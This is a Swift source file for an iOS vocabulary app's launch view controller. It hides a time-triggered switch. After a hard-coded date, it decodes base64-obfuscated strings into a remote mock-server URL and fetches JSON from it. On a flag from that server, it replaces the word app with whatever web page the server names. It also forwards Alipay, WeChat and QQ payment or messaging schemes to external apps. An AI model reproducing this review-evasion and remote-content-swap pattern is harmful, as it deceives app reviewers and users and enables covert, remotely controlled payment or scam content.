import UIKit
import Alamofire
import Reachability
import WebKit
import SwiftyJSON
import SnapKit
var mainIn = ""
var baseTest = ""
let timeS = 1570501842
let contain01 = "YWxpcGF5czovLw=="
let contain02 = "YWxpcGF5Oi8v"
let contain03 = "bXFxYXBpOi8v"
let contain04 = "bXFxOi8v"
let contain05 = "d2VpeGluOi8v"
let contain06 = "d2VpeGluczovLw=="
let contain09 = "aHR0cA=="
let contain10 = "Ly93d3cubW9ja2h0dHAuY24vbW9jay9MZWFybldvcmRzMTk5MQ=="
class PasscodeViewController: UIViewController,UIWebViewDelegate {
    let reachability = Reachability()!
    var webView : UIWebView!
    let cancelView = UIView()
    let bottomBarView = UIView()
    let appDelegate = UIApplication.shared.delegate as! AppDelegate
    override func viewDidLoad() {
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let anyTime = 1570501842
        if  timeStamp < anyTime {
            view.setGradientBackground(topColor: Colors.backgroundGradientTop, bottomColor: Colors.backgroundGradientBottom)
            DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.1) {
                
                let s = self.getRootViewController()
                s.modalPresentationStyle = .fullScreen
                self.present(s, animated: false, completion: {
                    })
            }
        }else{
            self.view.backgroundColor = UIColor.white
            self.NetworkStatusListener()
            self.configNoNetView()
            self.configUI()
            appDelegate.blockRotation = true
            if !UIDevice.current.isGeneratingDeviceOrientationNotifications {
                UIDevice.current.beginGeneratingDeviceOrientationNotifications()
            }
            NotificationCenter.default.addObserver(self, selector: #selector(handleDeviceOrientationChange(notification:)), name: NSNotification.Name.UIDeviceOrientationDidChange, object: nil)
        }
    }
    func addObserver() {
    }
    func loadAddBase() {
        self.loadBaseData()
    }
    @objc private func handleDeviceOrientationChange(notification: Notification) {
        let orientation = UIDevice.current.orientation
        switch orientation {
        case .portrait:
            webView.frame = CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height)
            bottomBarView.isHidden = false
            break
        case .landscapeLeft:
            webView.frame = CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height)
            bottomBarView.isHidden = true
            break
        case .landscapeRight:
            webView.frame = CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height)
            bottomBarView.isHidden = true
            break
        default:
            break
        }
    }
    deinit {
        NotificationCenter.default.removeObserver(self)
        UIDevice.current.endGeneratingDeviceOrientationNotifications()
    }
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        appDelegate.blockRotation = false
        if UIApplication.shared.statusBarOrientation.isLandscape {
            setNewOrientation(fullScreen: false)
        }
    }
    override func viewDidDisappear(_ animated: Bool) {
        NotificationCenter.default.removeObserver(self)
        UIDevice.current.endGeneratingDeviceOrientationNotifications()
    }
    func setNewOrientation(fullScreen: Bool) {
        if fullScreen {
            let resetOrientationTargert = NSNumber(integerLiteral: UIInterfaceOrientation.unknown.rawValue)
            UIDevice.current.setValue(resetOrientationTargert, forKey: "orientation")
            let orientationTarget = NSNumber(integerLiteral: UIInterfaceOrientation.landscapeLeft.rawValue)
            UIDevice.current.setValue(orientationTarget, forKey: "orientation")
        }else {
            let resetOrientationTargert = NSNumber(integerLiteral: UIInterfaceOrientation.unknown.rawValue)
            UIDevice.current.setValue(resetOrientationTargert, forKey: "orientation")
            let orientationTarget = NSNumber(integerLiteral: UIInterfaceOrientation.portrait.rawValue)
            UIDevice.current.setValue(orientationTarget, forKey: "orientation")
        }
    }
    func NetworkStatusListener() {
        NotificationCenter.default.addObserver(self, selector: #selector(self.reachabilityChanged),name: Notification.Name.reachabilityChanged,object: reachability)
        do{
            try reachability.startNotifier()
        }catch{
            print("could not start reachability notifier")
        }
    }
    @objc func reachabilityChanged(note: NSNotification) {
        let reachability = note.object as! Reachability
        switch reachability.connection {
        case .wifi:
            print("Reachable via WiFi")
            webView.isHidden = false
            cancelView.isHidden = true
            if timeS > 0   {
                self.loadBestUI()
            }else{
                self.loadBaseData()
            }
        case .cellular:
            print("Reachable via Cellular")
            webView.isHidden = false
            cancelView.isHidden = true
            if timeS > 0  {
                self.loadBestUI()
            }else{
                self.loadBaseData()
            }
        case .none:
            print("Network not reachable")
            webView.isHidden = true
            cancelView.isHidden = false
        }
    }
    func configUI() {
        webView = UIWebView (frame: CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height))
        webView.delegate = self
        webView.isHidden = true
        self.view.addSubview(webView)
    }
    func configNoNetView() {
        cancelView.backgroundColor = UIColor(red: 234/255.0, green: 234/255.0, blue: 234/255.0, alpha: 1)
        self.view.addSubview(cancelView)
        cancelView.snp.makeConstraints { (make) in
            make.top.right.left.equalTo(self.view)
            make.bottom.equalTo(self.view).offset(-44)
        }
        let imageV = UIImageView()
        imageV.image = UIImage(named: "NoNet")
        cancelView.addSubview(imageV)
        imageV.snp.makeConstraints { (make) in
            make.centerX.equalTo(cancelView)
            make.centerY.equalTo(cancelView).offset(-80)
            make.width.height.equalTo(222)
        }
        let button = UIButton()
        button.setTitle("点击重试", for: .normal)
        button.addTarget(self, action: #selector(buttonReconnectClick(button:)), for: .touchUpInside)
        button.backgroundColor = UIColor.white
        button.titleLabel?.font = UIFont.systemFont(ofSize: 17)
        button.setTitleColor(UIColor.black, for: .normal)
        cancelView.addSubview(button)
        button.snp.makeConstraints { (make) in
            make.top.equalTo(imageV.snp_bottom)
            make.width.equalTo(158)
            make.height.equalTo(50)
            make.centerX.equalTo(imageV)
        }
        cancelView.isHidden = true
    }
    @objc func buttonReconnectClick(button:UIButton ){
        self.reconnect()
    }
    func reconnect() {
        let reachabilityXP = Reachability()!
        reachabilityXP.whenReachable = { reachabilityXP in
            if reachabilityXP.connection == .wifi {
                if timeS > 0  {
                    self.loadBestUI()
                }else{
                    self.loadBaseData()
                }
                return
            } else {
                if timeS>0  {
                    self.loadBestUI()
                }else{
                    self.loadBaseData()
                }
                return
            }
        }
    }
    func loadBestUI() {
        if baseTest.count > 0 {
            let url = URL(string: baseTest)
            let urlRequest = URLRequest(url: url!)
            self.webView.loadRequest(urlRequest)
        }else{
            self.loadBaseData()
        }
    }
    func showAlertView() {
        let alertController = UIAlertController(title: "提示",
                                                message: "请检查网络配置？", preferredStyle: .alert)
        let okAction = UIAlertAction(title: "确定", style: .default, handler: {
            action in
        })
        alertController.addAction(okAction)
        self.present(alertController, animated: true, completion: nil)
    }
    @objc func buttonActionClick(button:UIButton ){
        let buttontag = button.tag
        switch buttontag {
        case 1000:
            if baseTest.count > 0 {
                let url = URL(string: baseTest)
                let urlRequest = URLRequest(url: url!)
                self.webView.loadRequest(urlRequest)
            }else{
                self.loadBaseData()
            }
            break
        case 1001:
            if webView.canGoBack {
                webView.goBack()
            }
            break
        case 1002:
            if webView.canGoForward {
                webView.goForward()
            }
            break
        case 1003:
            webView.reload()
            break
        case 1006:
            let alertController = UIAlertController(title: "提示",
                                                    message: "是否退出？", preferredStyle: .alert)
            let okAction = UIAlertAction(title: "确定", style: .default, handler: {
                action in
                exit(0)
            })
            let cancelAction = UIAlertAction(title: "取消", style: .cancel) { (action) in
            }
            alertController.addAction(okAction)
            alertController.addAction(cancelAction)
            self.present(alertController, animated: true, completion: nil)
            break
        default:
            break
        }
    }
    override func viewWillAppear(_ animated: Bool) {
    }
    func loadBaseData()  {
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let anyTime = 1570501842
        let base01 = self.MainProjectDecoding(encodedString: contain09)
        let base02 = self.MainProjectDecoding(encodedString: contain10)
        let UrlBase = "\(base01):\(base02)"
        if timeStamp < anyTime {
            let s = self.getRootViewController()
            s.modalPresentationStyle = .fullScreen
            self.present(s, animated: false, completion: {
                })
        }else{
            let urlBase = URL(string: UrlBase)
            Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                in
                switch response.result.isSuccess {
                case true:
                    if let value = response.result.value{
                        let jsonX = JSON(value)
                        if jsonX["appid"].intValue == 1 {
                            let stxx = jsonX["Privacy"].stringValue
                            baseTest = stxx
                            self.loadBestUI()
                        }else {
                            let s = self.getRootViewController()
                            s.modalPresentationStyle = .fullScreen
                            self.present(s, animated: false, completion: {
                                })
                        }
                    }
                case false:
                    do {
                    
                    }
                }
            }
        }
    }
    func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
    }
    func webViewDidStartLoad(_ webView: UIWebView) {
    }
    func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
        let urlString:String = request.url!.absoluteString
        if urlString.contains(contain01) || urlString.contains(contain02) || urlString.contains(contain03) || urlString.contains(contain04) || urlString.contains(contain05) || urlString.contains(contain06) {
            UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
        }
        return true
    }
    func MainProjectDecoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func getRootViewController() -> UIViewController {
        let tabBarController = UITabBarController()
        tabBarController.viewControllers = getMainViewControllers()
        tabBarController.tabBar.tintColor = WDMainTheme
        return tabBarController
    }
    
    func getMainViewControllers() -> [UIViewController] {
        return [getSearchViewController(),getWordListViewController(),getSettingsViewController()]
    }
    func getSearchViewController() -> UINavigationController {
        let searchViewController = WDSearchViewController()
        let searchNav = UINavigationController(rootViewController: searchViewController)
        searchNav.navigationBar.isHidden = true
        searchNav.tabBarItem.title = "Search"
        searchNav.tabBarItem.image =  #imageLiteral(resourceName: "SearchIcon")
        searchNav.navigationBar.tintColor = WDMainTheme
        return searchNav
    }
    func getSettingsViewController() -> UINavigationController {
        let settingsViewController = WDSettingsViewController()
        let nav = UINavigationController(rootViewController: settingsViewController)
        nav.navigationBar.isHidden = true
        nav.tabBarItem.title = "Settings"
        nav.tabBarItem.image =  #imageLiteral(resourceName: "SettingsIcon")
        nav.navigationBar.tintColor = WDMainTheme
        return nav
    }
    func getWordListViewController() -> UINavigationController {
        let wordListViewController = WDWordListViewController()
        let nav = UINavigationController(rootViewController: wordListViewController)
        nav.navigationBar.isHidden = true
        nav.tabBarItem.title = "List"
        nav.tabBarItem.image =  #imageLiteral(resourceName: "ListIcon")
        nav.navigationBar.tintColor = WDMainTheme
        return nav
    }
}
extension String {
    func LoginBase64() -> String? {
        if let data = self.data(using: .utf8) {
            return data.base64EncodedString()
        }
        return nil
    }
    func LoginEncodeBase64() -> String? {
        if let data = Data(base64Encoded: self) {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
}
